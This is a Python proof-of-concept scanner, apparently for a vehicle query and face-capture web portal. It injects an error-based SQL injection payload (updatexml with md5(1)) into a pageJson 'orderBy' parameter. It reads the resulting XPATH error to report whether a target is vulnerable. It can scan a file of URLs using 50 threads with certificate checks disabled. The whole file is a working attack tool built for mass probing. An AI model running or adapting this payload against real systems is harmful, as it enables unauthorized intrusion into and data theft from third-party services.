#导包
import requests
import re
import sys
import argparse
from multiprocessing.dummy import Pool
import urllib3
urllib3.disable_warnings()

def banner():
    ico = """
.------..------..------..------..------.
|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
| :/\: || (\/) || :/\: || :/\: || (\/) |
| (__) || :\/: || :\/: || (__) || :\/: |
| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
`------'`------'`------'`------'`------'

    """
    print(ico)

def main():
    banner()
    parser = argparse.ArgumentParser(description='SQL INJECT')
    parser.add_argument('-u', '--url', dest='url', type=str, help='单个URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='批量URL文件')
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
#通过响应中存在1的md5加密值来判断
def poc(target):
    payload = "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select+md5%281%29),0x7e),1)--%22%7D/extend/%7B%7D"
    try:
        head={
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'close'
        }
        res1 = requests.get(url=target + payload, verify=False, timeout=5,headers=head)
        
        match = re.search(r"XPATH syntax error: '(.+?)'", res1.text,re.S)
        # print((res1.text))
        if match and 'c4ca4238a0b923820dcc509a6f75849' in match.group(1) :
            print(f"[+]{target}    存在漏洞！！！！")
            # with open('result.txt','a') as fp:
            #     fp.write(target+'\n')
        else:
            print(f"[-]{target}    不存在漏洞")
    except Exception as e:
        print(f"[-]{target}    请求出现异常：{e}")


if __name__ == '__main__':
    main()
